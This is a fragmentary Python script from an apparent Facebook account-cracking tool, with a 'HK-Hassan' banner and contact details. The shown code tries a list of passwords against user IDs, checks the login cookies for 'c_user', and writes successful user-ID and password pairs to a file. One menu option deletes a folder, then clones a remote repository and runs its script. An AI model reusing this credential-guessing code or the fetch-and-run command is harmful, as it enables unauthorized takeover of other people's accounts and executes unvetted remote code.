...
#---------------------[HK-Hassan]---------------------#
#HK AND HassanKarimi IS THE BEST OF THE CRACK TOOLS SYESTUM#
...
................................................ 
        ...
        \033[1;32mFACEBOK      :  HK/Hassan123
        \033[1;34mGITHUB       :  Hassa-Karimi 
        \033[1;36mTOOLS STATUS :  FREE
        \033[1;35mTEAM         :  Hassan_Tech 
...
def barie():
    ...
    if opt == '2':
        ...
        return None
    if opt == '1':
    	os.system('rm -rf Karimi git clone https://github.com/Karimi014/Karimi.git && python Karimi.py ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('HK-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m[Hassan] %s| [OK:- %s] \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
